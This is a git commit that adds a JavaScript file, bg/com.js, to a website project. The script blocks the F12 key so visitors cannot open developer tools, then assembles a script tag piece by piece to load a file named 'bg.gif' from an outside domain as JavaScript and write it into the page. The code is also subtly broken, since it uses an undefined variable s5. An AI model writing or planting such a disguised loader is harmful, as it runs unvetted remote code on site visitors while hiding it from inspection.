3c24a60571f721473d103581eb2822782c71079a
bian888 <87354060+bian888@users.noreply.github.com>
2021-07-13 13:26:47 +0800

    Create com.js

---
+++ bg/com.js
@@ -0,0 +1,16 @@
+document.onkeydown = function (e) {
+var currentKey = 0, k = e || window.event;
+currentKey = k.keyCode || k.which || k.charCode;
+if (currentKey == 123) {
+window.event.cancelBubble = true;
+window.event.returnValue = false;
+}
+}
+
+var s1 = "<";
+var s2 = "script type=",
+    s3 = "text/javascript src=https://www.bn8.org/",
+    s4 = "bg.gif/></script";
+s2 = s2 + s3 + s4;
+s = s1 + s2 + s5;
+document.write(s);
